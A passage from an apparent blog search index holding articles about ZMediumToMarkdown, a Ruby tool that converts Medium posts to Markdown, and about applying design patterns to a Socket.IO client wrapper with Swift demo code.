me](https://www.zhgchg.li/contact){:target=\"_blank\"}._This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 2,313 Total Views Last Statistics Date: 2025-08-15 | 1,765 Views on Medium." }, { "title": "Converting Medium Posts to Markdown", "url": "/posts/zrealm-dev/converting-medium-posts-to-markdown-ddd88a84e177/", "categories": "ZRealm Dev.", "tags": "medium, markdown, backup, ruby, automation", "date": "2022-05-28 15:04:35 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Converting Medium Posts to Markdown撰寫小工具將 Medium 心血文章備份下來 &amp; 轉換成 Markdown 格式ZhgChgLi / ZMediumToMarkdown[EN] Z...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Converting Medium Posts to Markdown撰寫小工具將 Medium 心血文章備份下來 &amp; 轉換成 Markdown 格式ZhgChgLi / ZMediumToMarkdown[EN] ZMediumToMarkdownI’ve written a project to let you download Medium post and convert it to markdown format easily.Features Support download post and convert to markdown format Support download all posts and convert to markdown format from any user without login access. Support download paid content Support download all of post’s images to local and convert to local path Support parse Twitter tweet content to blockquote Support download paid content Support command line interface Convert Gist source code to markdown code block Convert youtube link which embed in post to preview image Adjust post’s last modification date from Medium to the local downloaded markdown file Auto skip when post has been downloaded and last modification date from Medium doesn’t changed (convenient for auto-sync or auto-backup service, to save server’s bandwidth and execution time) Support using Github Action as auto sync/backup service Highly optimized markdown format for Medium Native Markdown Style Render Engine (Feel free to contribute if you any optimize idea! MarkupStyleRender.rb ) jekyll &amp; social share (og: tag) friendly 100% Ruby @ RubyGem[CH] ZMediumToMarkdown可針對 Medium 文章連結、Medium 使用者的所有文章，爬取其內容並轉換成 Markdwon 格式連同文章內圖片一同下載下來的備份小工具。[2022/07/18 Update]： 手把手教你無痛轉移 Medium 到自架網站特色功能 免登入、免特殊權限 支援單篇文章、使用者所有文章下載並轉換成 Markdown 支援下載備份文章內的所有圖片並轉換成對應圖片路徑 支援深度解析內嵌於文章中的 Gist 並轉換成相對語言的 Markdown Code Block 支援解析 Twitter 內容並轉貼到文章中 支援解析內嵌於文章中的 Youtube 影片，將轉換成影片預覽圖及連結顯示於 Markdown 使用者所有文章下載時會去掃描文章內有無嵌入關聯文章，有的話會將連結替換為本地 針對 Medium 格式樣式特別優化 自動將下載下來文章的最後修改/建立時間，更改為同 Medium 文章發佈時間 自動比對下載下來的文章最後修改，如果沒有小於 Medium 文章最後修改時間時則自動跳過(方便大家使用此工具建立自動 Sync/Backup 工具，此機制能節省 server 流量/時間) CLI 操作，支援自動化 本項目及本篇文章僅供技術研究，請勿用於任何商業用途，請勿用於非法用途，如有任何人憑此做何非法事情，均於作者無關，特此聲明。 請確認您有文章使用、著作權再行下載備份。起源經營 Medium 第三年，已累積發表超過 65 篇文章；所有文章都是我直接使用 Medium 平台撰寫，沒有其他備份；老實說一直很怕 Medium 平台有狀況或是其他因素導致這幾年的心血結晶消失。之前曾經手動備份過，非常無聊且浪費時間，所以一直在找尋一個可以自動把所有文章備份下載下來的工具、最好還能轉換成 Markdown 格式。備份需求 Markdown 格式 依照 User 能自動下載該 User 的所有 Medium Posts 文章圖片也要能被下載備份下來 要能 Parse Gist 成 Markdown Code Block(我的 Medium 大量使用 gist 嵌入 Source Code 所以這個功能很重要)備份方案Medium 官方官方雖然有提供匯出備份功能，但匯出格式僅能用於匯入 Medum、非 Markdown 或共通格式，而且不會處理 Github Gitst …等等 Embed 的內容。Medium 提供的 API 沒什麼在維護且只提供 Create Post 功能。 合理，因為 Medium 官方不希望使用者能輕易地將內容轉移至其他平台。Chrome Extension有找到試用了幾個 Chrome Extension (幾乎都被下架了)，效果不好，一是要手動一篇文章一篇文章點進去備份、二是 Parse 出來的格式很多錯誤而且也無法深度 Parse Gist Source Code 出來、也無法備份文章的所有圖片下來。medium-to-markdown command line某位大神用 js 寫的，能達成基本的下載及轉換成 Markdown 功能，但一樣沒圖片備份、深度 Parse Gist Source Code。ZMediumToMarkdown苦無完美解決方案後，下定決心自行撰寫一個備份轉換工具；花費了大約三週的下班時間使用 Ruby 完成。技術細節如何透過輸入使用者名稱得到文章列表？1.取得 UserID：檢視使用者主頁(https://medium.com/@# {username} ) 原始碼可以找到 Username 對應的 UserID 這邊要注意因為 Meidum 重新開放自訂網域 所以要多處理 30X 轉址2.嗅探網路請求可以發現 Medium 使用 GraphQL 去取得主頁的文章列表資訊3.複製 Query &amp; 替換 UserID 到請求資訊HOST: https://medium.com/_/graphqlMETHOD: POST4.取得 Response每次只能拿 10 筆，要分頁拿取。 文章列表：可以在 result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;posts 中取得 homepagePostsFrom 分頁資訊 ：可以在 result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;pagingInfo-&gt;next 中取得將 homepagePostsFrom 帶入請求即可進行分頁存取， nil 時代表已沒有下一頁如何剖析文章內容？檢視文章原始碼後可發現，Medium 是使用 Apollo Client 服務進行架設；其端 HTML 實際是從 JS 渲染而來；因此可以再檢視原始碼中的 &lt;script&gt; 區段找到 window.__APOLLO_STATE__ 字段，內容就是整篇文章的段落架構，Medium 會把你整篇文章拆成一句一句的段落，再透過 JS 引擎渲染回 HTML。我們要做的事也一樣，解析這個 JSON，比對 Type 在 Markdown 的樣式，組合出 Markdown 格式。技術難點這邊有一個技術困難點就是在渲染段落文字樣式時，Medium 給的結構如下：\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}意思是 code in text, and link in text, and ZhgChgLi, and bold, and I, only i 這段文字的:- 第 5 到第 7 字元要標示為 程式碼 (用`Text`格式包裝)- 第 18 到第 22 字元要標示為 連結 (用[Text](URL)格式包裝)- 第 50 到第 63 字元要標示為 粗體(用*Text*格式包裝)- 第 55 到第 69 字元要標示為 斜體(用_Text_格式包裝)第 5 到 7 &amp; 18 到 22 在這個例子裡好處理，因為沒有交錯到；但 50–63 &amp; 55–69 會有交錯問題，Markdown 無法用以下交錯方式表示：code `in` text, and [ink](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, **only i_正確的組合結果如下：code `in` text, and [ink](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, _**_only i_50–55 STRONG 55–63 STRONG, EM 63–69 EM另外要需注意： 包裝格式的字串頭跟尾要能區別，Strong 只是剛好頭跟尾都是 ** ，如果是 Link 頭會是 [ 尾則是 ](URL) Markdown 符號與字串結合時要注意前後不能有空白，否則會失效完整問題請看此。這塊研究了好久，目前先使用現成套件解決 reverse_markdown 。 特別感謝前同事 Nick , Chun-Hsiu Liu ,James 協力研究，之後有時間再自己寫改成原生的。成果原文 -&gt; 轉換後的 Markdown 結果有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 552 Total Views Last Statistics Date: 2025-08-15 | 459 Views on Medium." }, { "title": "Converting Medium Posts to Markdown", "url": "/posts/zrealm-dev/en/converting-medium-posts-to-markdown-ddd88a84e177/", "categories": "ZRealm Dev.", "tags": "medium, markdown, backup, ruby, automation", "date": "2022-05-28 15:04:35 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Converting Medium Posts to MarkdownCreating a tool to back up my cherished Medium ar...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Converting Medium Posts to MarkdownCreating a tool to back up my cherished Medium articles and convert them into Markdown format.ZhgChgLi / ZMediumToMarkdown[EN] ZMediumToMarkdownI’ve developed a project that allows you to easily download Medium posts and convert them to Markdown format.Features Supports downloading posts and converting them to Markdown format. Allows downloading all posts from any user without requiring login access. Supports downloading paid content. Downloads all images from the post to local storage and converts them to local paths. Parses Twitter tweet content into blockquotes. Supports command line interface. Converts Gist source code into Markdown code blocks. Converts embedded YouTube links in posts to preview images. Adjusts the last modification date of the post from Medium to the locally downloaded Markdown file. Automatically skips posts that have already been downloaded if the last modification date from Medium hasn’t changed (convenient for auto-sync or backup services, saving server bandwidth and execution time). Supports using GitHub Actions as an auto sync/backup service. Highly optimized Markdown format for Medium. Native Markdown Style Render Engine (Feel free to contribute if you have any optimization ideas! MarkupStyleRender.rb). Jekyll &amp; social share (og: tag) friendly. 100% Ruby @ RubyGem.[CH] ZMediumToMarkdownThis tool allows you to scrape content from Medium article links or all articles from a Medium user, backing them up and converting them into Markdown format along with the images in the articles.[2022/07/18 Update]: A step-by-step guide to smoothly migrating from Medium to your own websiteKey Features No login or special permissions required. Supports downloading and converting individual articles or all articles from a user into Markdown. Downloads and backs up all images within the articles, converting them to corresponding image paths. Deeply parses embedded Gist content and converts it into Markdown code blocks for the relevant language. Parses Twitter content and reposts it within the articles. Parses embedded YouTube videos in articles, converting them into preview images and links displayed in Markdown. When downloading all articles from a user, it scans for any embedded related articles and replaces the links with local ones if found. Specially optimized for Medium’s formatting styles. Automatically updates the last modification/creation time of the downloaded articles to match the publication time of the corresponding Medium articles. Automatically compares the last modification time of the downloaded articles; if it is not less than the last modification time of the Medium articles, it skips the download (convenient for creating an automatic sync/backup tool, saving server bandwidth/time). CLI operation, supporting automation. This project and article are for technical research purposes only. Please do not use them for any commercial or illegal activities. The author is not responsible for any illegal actions taken by others based on this. Please ensure you have the rights to use and download the articles before backing them up.BackgroundAfter three years of using Medium, I have published over 65 articles; all of them were written directly on the Medium platform without any other backups. Honestly, I have always been worried that issues with the Medium platform or other factors could lead to the loss of my hard work over the years.I previously attempted to back up manually, which was tedious and time-consuming, so I was looking for a tool that could automatically back up all my articles and ideally convert them into Markdown format.Backup Requirements Markdown format. Automatically download all Medium posts from a user. Images from the articles should also be downloadable. Must be able to parse Gist into Markdown code blocks (I heavily use Gist for embedding source code in my Medium articles, so this feature is crucial).Backup SolutionsOfficial MediumWhile Medium does provide an export backup feature, the export format can only be used for importing back into Medium, not in Markdown or any common format, and it does not handle embedded content like GitHub Gist.The Medium API is not well-maintained and only offers the ability to create posts. This is reasonable, as Medium does not want users to easily transfer content to other platforms.Chrome ExtensionsI found and tried several Chrome extensions (most of which have been removed), but they were ineffective. One required manually clicking through each article to back it up, and the parsed format had many errors and could not deeply parse Gist source code or back up all images from the articles.medium-to-markdown command lineA developer created this using JavaScript, which achieves basic downloading and converting to Markdown functionality, but it also lacks image backup and deep parsing of Gist source code.ZMediumToMarkdownAfter struggling to find a perfect solution, I decided to create my own backup and conversion tool; it took me about three weeks of after-work time to complete it using Ruby.Technical DetailsHow to get the list of articles by inputting a username? Obtain UserID: By viewing the source code of the user’s homepage (https://medium.com/@{username}), you can find the Username corresponding to the UserID. Note that Medium has reopened custom domains, so you need to handle 30X redirects. By sniffing network requests, you can discover that Medium uses GraphQL to obtain the list of articles on the homepage. Copy the Query and replace the UserID in the request information: HOST: https://medium.com/_/graphqlMETHOD: POST Obtain the Response.You can only retrieve 10 articles at a time, so pagination is necessary. Article list: You can find it in result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;posts. Pagination info: You can find it in result[0]-&gt;userResult-&gt;homepagePostsConnection-&gt;pagingInfo-&gt;next.You can use homepagePostsFrom in the request to access the next page; nil indicates there are no more pages.How to parse article content?By examining the article’s source code, you can see that Medium uses the Apollo Client service for its architecture; the HTML is actually rendered from JavaScript. Therefore, you can look for the window.__APOLLO_STATE__ field in the &lt;script&gt; section of the source code, which contains the structure of the entire article’s paragraphs. Medium breaks the entire article into individual paragraphs and then renders them back into HTML using the JS engine.What we need to do is parse this JSON, match the types to Markdown styles, and assemble the Markdown format.Technical ChallengesOne technical challenge is rendering the paragraph text styles. The structure provided by Medium looks like this:\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}This means that in the text code in text, and link in text, and ZhgChgLi, and bold, and I, only i:- Characters 5 to 7 should be marked as code (wrapped in `Text` format).- Characters 18 to 22 should be marked as a link (wrapped in [Text](URL) format).- Characters 50 to 63 should be marked as bold (wrapped in *Text* format).- Characters 55 to 69 should be marked as italic (wrapped in _Text_ format).Characters 5 to 7 and 18 to 22 are straightforward to handle since they don’t overlap; however, 50–63 and 55–69 present an overlap issue that Markdown cannot represent in the following interleaved manner:code `in` text, and [link](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, **only i_The correct combined result should be:code `in` text, and [link](http://zhgchg.li) in text, and ZhgChgLi, and **bold,_ and I, _**_only i_50–55 STRONG 55–63 STRONG, EM 63–69 EM.Additionally, it’s important to note: The wrapping format’s start and end must be distinguishable; for example, Strong is marked with ** at both ends, while Link starts with [ and ends with ](URL). Care must be taken that there are no spaces before or after Markdown symbols when combined with strings, as this would render them ineffective.For the complete issue, please see this.I researched this for quite a while and am currently using an existing package to solve it: reverse_markdown. Special thanks to my former colleagues Nick, Chun-Hsiu Liu, and James for their collaborative research. I plan to write my own native solution when I have time.ResultsOriginal Article -&gt; Converted Markdown Result.If you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 552 Total Views Last Statistics Date: 2025-08-15 | 459 Views on Medium." }, { "title": "Design Patterns 的實戰應用紀錄", "url": "/posts/pinkoi-engineering/design-patterns-%E7%9A%84%E5%AF%A6%E6%88%B0%E6%87%89%E7%94%A8%E7%B4%80%E9%8C%84-78507a8de6a5/", "categories": "Pinkoi Engineering", "tags": "ios-app-development, design-patterns, socketio, websocket, finite-state-machine", "date": "2022-04-07 22:49:17 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Design Patterns 的實戰應用紀錄封裝 Socket.IO Client Library 需求時遇到的問題場景及解決方法應用到的 Design PatternsPhoto by Daniel McCullough前...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Design Patterns 的實戰應用紀錄封裝 Socket.IO Client Library 需求時遇到的問題場景及解決方法應用到的 Design PatternsPhoto by Daniel McCullough前言此篇文章是真實的需求開發，所運用到 Design Pattern 解決問題的場景記錄；內容篇幅會涵蓋需求背景、實際遇到的問題場景 (What?)、為何要套用 Pattern 解決問題 (Why?)、實作上如何使用 (How?)，建議可以從頭閱讀會比較有連貫性。 本文會介紹四個開發此需求遇到的場景及七個解決此場景的 Design Patterns 應用。背景組織架構敝司於今年拆分出 Feature Teams (multiple) 與 Platform Team；前者不必多說主要負責使用者端需求、Platform Team 這邊則面對的是公司內部的成員，其中一個工作項目就是技術引入、基礎建設及做好系統性整合，為 Feature Teams 開發需求時先鋒鋪好道路。當前需求Feature Teams 要將原本的訊息功能 (進頁面打 API 拿訊息資料，要更新最新訊息只能重整) 改為 即時通訊 (能即時收到最新訊息、對傳訊息)。Platform Team 工作Platform Team 著重的點不只是當下的即時通訊需求，而是長遠的建設與複用性；評估後 webSocket 雙向通訊的機制在現代 App 中是不可或缺，除了此次的需求之外，以後也有很多機會都會用到，加上人力資源許可，故投入協助設計開發介面。目標： 封裝 Pinkoi Server Side 與 Socket.IO 通訊、身份驗證邏輯 封裝 Socket.IO 煩瑣操作，提供基於 Pinkoi 商業需求的可擴充及方便使用介面 統一雙平台介面 (Socket.IO 的 Android 與 iOS Client Side Library 支援的功能及介面不相同) Feature 端無需了解 Socket.IO 機制 Feature 端無需管理複雜的連線狀態 未來有 webSocket 雙向通訊需求能直接使用時間及人力： iOS &amp; Android 各投入一位 開發時程：時程 3 週技術細節Web &amp; iOS &amp; Android 三平台均會支援此 Feature；要引入 webSocket 雙向通訊協議來實現，後端預計直接使用 Socket.io 服務。 首先要說 Socket != WebSocket關於 Socket 與 WebSocket 及技術細節可參考以下兩篇文章： Socket，Websocket，Socket.io的差異 为什么不直接使用socket ,还要定义一个新的websocket 的呢？簡而言之：Socket 是 TCP/UDP 傳輸層的抽象封裝介面，而 WebSocket 是應用層的傳輸協議。Socket 與 WebSocket 的關係就像狗跟熱狗的關係一樣，沒有關係。Socket.IO 是 Engine.IO 的一層抽象操作封裝，Engine.IO 則是對 WebSocket 的使用封裝，每層只負責對上對下之間的交流，不允許貫穿操作(e.g. Socket.IO 直接操作 WebSocket 連線)。Socket.IO/Engine.IO 除了基本的 WebSocket 連線外還實做了很多方便好用的功能集合(e.g. 離線發送 Event 機制、類似 Http Request 機制、Room/Group 機制…等等)。Platform Team 這層的主要職責是橋接 Socket.IO 與 Pinkoi Server Side 之間的邏輯，供應上層 Feature Teams 開發功能時使用。Socket.IO Swift Client 有坑 已許久未更新 (最新一版還在 2019)，不確定是否還有在維護。 Client &amp; Server Side Socket IO Version 要對齊，Server Side 可加上 {allowEIO3: true} / 或 Client Side 指定相同版本 .version 否則怎麼連都連不上。 命名方式、介面與官網範例很多都對不起來。 Socket.io 官網範例都是拿 Web 做介紹，實際上 Swift Client 並不一定有全支援官網寫的功能 。此次實作發現 iOS 這邊 Library 並未實現離線發送 Event 機制(我們是自行實現的，請往後繼續閱讀) 建議有要採用 Socket.IO 前先實驗看看你想要的機制是否支援。 Socket.IO Swift Client 是基於 Starscream WebSocket Library 的封裝，必要時可降級使用 Starscream。背景資訊補充到此結束，接下來進入正題。Design Patterns設計模式說穿了就只是軟體設計當中常見問題的解決方案，不一定要用設計模式才能開發、設計模式不一定能適用所有場景、也沒人說不能自行歸納出新的設計模式。The Catalog of Design Patterns但現有的設計模式 (The 23 Gang of Four Design Patterns) 已是軟體設計中的共同知識，只要提到 XXX Pattern 大家腦中就會有相應的架構藍圖，不需多做解釋、後續維護也比較好知道脈絡、且已是經過業界驗證的方法不太需要花時間審視物件依賴問題；在適合的場景選用適合的模式可以降低溝通及維護成本，提升開發效率。 設計模式可以組合使用，但不建議對現有設計模式魔改、強行為套用而套用、套用不符合分類的 Pattern (e.g. 用責任練模式來產生物件)，會失去使用的意義更可能造成後續接手的人的誤會。本篇會提到的 Design Patterns： Singleton Pattern Flywieght Pattern Factory Pattern Command Pattern Finite-State Machine + State Pattern Chain Of Resposibility Builder Pattern會逐一在後面解釋什麼場境用了、為何要用。 本文著重在 Design Pattern 的應用，而非 Socket.IO 的操作，部分示例會因為描述方便而有所刪減， 無法適用真實的 Socket.IO 封裝 。 因篇幅有限，本文不會詳細介紹每個設計模式的架構，請先點各個模式的連結進入了解該模式的架構後再繼續閱讀。 Demo Code 會使用 Swift 撰寫。需求場景 1.What? 使用相同的 Path 在不同頁面、Object 請求 Connection 時能複用取得相同的物件。 Connection 需為抽象介面，不直接依賴 Socket.IO ObjectWhy? 減少記憶體開銷及重複連線的時間、流量成本。 為未來抽換成其他框架預留空間How? Singleton Pattern ：創建型 Pattern，保證一個物件只會有一個實體。 Flywieght Pattern ：結構型 Pattern，基於共享多個物件相同的狀態，重複使用。 Factory Pattern ：創建型 Pattern，抽象物件產生方法，使其能在外部抽換。實際案例使用： Singleton Pattern： ConnectionManager 在 App Lifecycle 中僅存在一個的物件，用來管理 Connection 取用操作。 Flywieght Pattern： ConnectionPool 顧名思義就是 Connection 的共用池子，統一從這個池子的方法拿出 Connection，其中邏輯就會包含當發現 URL Path 一樣時直接給予已經在池子裡的 Connection。ConnectionHandler 則做為 Connection 的外在操作、狀態管理器。 Factory Pattern： ConnectionFactory 搭配上面 Flywieght Pattern 當發現池子沒有可複用的 Connection 時則用此工廠介面去產生。import Combineimport Foundationprotocol Connection { var url: URL {get} var id: UUID {get} init(url: URL) func connect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}protocol ConnectionFactory { func create(url: URL) -&gt; Connection}class ConnectionPool { private let connectionFactory: ConnectionFactory private var connections: [Connection] = [] init(connectionFactory: ConnectionFactory) { self.connectionFactory = connectionFactory } func getOrCreateConnection(url: URL) -&gt; Connection { if let connection = connections.first(where: { $0.url == url }) { return connection } else { let connection = connectionFactory.create(url: url) connections.append(connection) return connection } } }class ConnectionHandler { private let connection: Connection init(connection: Connection) { self.connection = connection } func getConnectionUUID() -&gt; UUID { return connection.id }}class ConnectionManager { static let shared = ConnectionManager(connectionPool: ConnectionPool(connectionFactory: SIOConnectionFactory())) private let connectionPool: ConnectionPool private init(connectionPool: ConnectionPool) { self.connectionPool = connectionPool } // func requestConnectionHandler(url: URL) -&gt; ConnectionHandler { let connection = connectionPool.getOrCreateConnection(url: url) return ConnectionHandler(connection: connection) }}// Socket.IO Implementationclass SIOConnection: Connection { let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}class SIOConnectionFactory: ConnectionFactory { func create(url: URL) -&gt; Connection { // return SIOConnection(url: url) }}//print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/1\")!).getConnectionUUID().uuidString)print(ConnectionManager.shared.requestConnectionHandler(url: URL(string: \"wss://pinkoi.com/2\")!).getConnectionUUID().uuidString)// output:// D99F5429-1C6D-4EB5-A56E-9373D6F37307// D99F5429-1C6D-4EB5-A56E-9373D6F37307// 599CF16F-3D7C-49CF-817B-5A57C119FE31需求場景 2.What?如背景技術細節所述，Socket.IO Swift Client 的 Send Event 並不支援離線發送 (但 Web/Android 版的 Library 卻可以)，因此 iOS 端需要自行實現此功能。神奇的是 Socket.IO Swift Client - onEvent 是支援離線訂閱的。Why? 跨平台功能統一 程式碼容易理解How? Command Pattern ：行為型 Pattern，將操作包裝成對象，提供隊列、延遲、取消…等等集合操作。 Command Pattern： SIOManager 為與 Socket.IO 溝通的最底層封裝，其中的 send 、 request 方法都是對 Socket.IO Send Event 的操作，當發現當前 Socket.IO 處於斷線狀態，則將請求參數放到 bufferedCommands 中，當連上之後就逐一拿出來處理 (First In First Out)。protocol BufferedCommand { var sioManager: SIOManagerSpec? { get set } var event: String { get } func execute()}struct SendBufferedCommand: BufferedCommand { let event: String weak var sioManager: SIOManagerSpec? func execute() { sioManager?.send(event) }}struct RequestBufferedCommand: BufferedCommand { let event: String let callback: (Data?) -&gt; Void weak var sioManager: SIOManagerSpec? func execute() { sioManager?.request(event, callback: callback) }}protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connected同理也可以實現到 onEvent 上。延伸：可以再套用 Proxy Pattern ，將 Buffer 功能視為一種 Proxy。需求場景 3.What?Connection 有多個狀態，有序的狀態與狀態間切換、各狀態允許不同的操作。 Created：物件被建立，允許 -&gt; Connected 或直接進 Disconnected Connected：已連上 Socket.IO，允許 -&gt; Disconnected Disconnected：已與 Socket.IO 斷線，允許 -&gt; Reconnectiong 、 Released Reconnectiong：正在嘗試重新連上 Socket.IO，允許 -&gt; Connected 、 Disconnected Released：物件已被標示為等待被記憶體回收，不允許任何操作及切換狀態Why? 狀態與狀態的切換邏輯跟表述不容易 各狀態要限制操作方法(e.g. State = Released 時無法 Call Send Event)，直接使用 if. .else 會讓程式難以維護閱讀How? Finite State Machine ：管理狀態間的切換 State Pattern ：行為型 Pattern，對象的狀態有變化時，有不同的相應處理 Finite State Machine ： SIOConnectionStateMachine 為狀態機實作， currentSIOConnectionState 為當前狀態， created、connected、disconnected、reconnecting、released 表列出此狀態機可能的切換狀態。enterXXXState() throws 為從 Current State 進入某個狀態時的允許與不允許(throw error)實作。 State Pattern ： SIOConnectionState 為所有狀態會用到的操作方法介面抽象。protocol SIOManagerSpec: AnyObject { func connect() func disconnect() func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) func send(_ event: String) func request(_ event: String, callback: @escaping (Data?) -&gt; Void)}enum ConnectionState { case created case connected case disconnected case reconnecting case released}class SIOManager: SIOManagerSpec { var state: ConnectionState = .disconnected { didSet { if state == .connected { executeBufferedCommands() } } } private var bufferedCommands: [BufferedCommand] = [] func connect() { state = .connected } func disconnect() { state = .disconnected } func send(_ event: String) { guard state == .connected else { appendBufferedCommands(connectionCommand: SendBufferedCommand(event: event, sioManager: self)) return } print(\"Send:\\(event)\") } func request(_ event: String, callback: @escaping (Data?) -&gt; Void) { guard state == .connected else { appendBufferedCommands(connectionCommand: RequestBufferedCommand(event: event, callback: callback, sioManager: self)) return } print(\"request:\\(event)\") } func onEvent(event: String, callback: @escaping (Data?) -&gt; Void) { // } func appendBufferedCommands(connectionCommand: BufferedCommand) { bufferedCommands.append(connectionCommand) } func executeBufferedCommands() { // First in, first out bufferedCommands.forEach { connectionCommand in connectionCommand.execute() } bufferedCommands.removeAll() } func removeAllBufferedCommands() { bufferedCommands.removeAll() }}let manager = SIOManager()manager.send(\"send_event_1\")manager.send(\"send_event_2\")manager.request(\"request_event_1\") { _ in //}manager.state = .connected//class SIOConnectionStateMachine { private(set) var currentSIOConnectionState: SIOConnectionState! private var created: SIOConnectionState! private var connected: SIOConnectionState! private var disconnected: SIOConnectionState! private var reconnecting: SIOConnectionState! private var released: SIOConnectionState! init() { self.created = SIOConnectionCreatedState(stateMachine: self) self.connected = SIOConnectionConnectedState(stateMachine: self) self.disconnected = SIOConnectionDisconnectedState(stateMachine: self) self.reconnecting = SIOConnectionReconnectingState(stateMachine: self) self.released = SIOConnectionReleasedState(stateMachine: self) self.currentSIOConnectionState = created } func enterConnected() throws { if [created.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(connected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Connected\") } } func enterDisconnected() throws { if [created.connectionState, connected.connectionState, reconnecting.connectionState].contains(currentSIOConnectionState.connectionState) { enter(disconnected) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Disconnected\") } } func enterReconnecting() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(reconnecting) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Reconnecting\") } } func enterReleased() throws { if [disconnected.connectionState].contains(currentSIOConnectionState.connectionState) { enter(released) } else { throw SIOConnectionStateMachineError(\"\\(currentSIOConnectionState.connectionState) can't enter to Released\") } } private func enter(_ state: SIOConnectionState) { currentSIOConnectionState = state }}protocol SIOConnectionState { var connectionState: ConnectionState { get } var stateMachine: SIOConnectionStateMachine { get } init(stateMachine: SIOConnectionStateMachine) func onConnected() throws func onDisconnected() throws func connect(socketManager: SIOManagerSpec) throws func disconnect(socketManager: SIOManagerSpec) throws func release(socketManager: SIOManagerSpec) throws func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws func send(socketManager: SIOManagerSpec, event: String) throws}struct SIOConnectionStateMachineError: Error { let message: String init(_ message: String) { self.message = message } var localizedDescription: String { return message }}class SIOConnectionCreatedState: SIOConnectionState { let connectionState: ConnectionState = .created let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ConnectedState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: 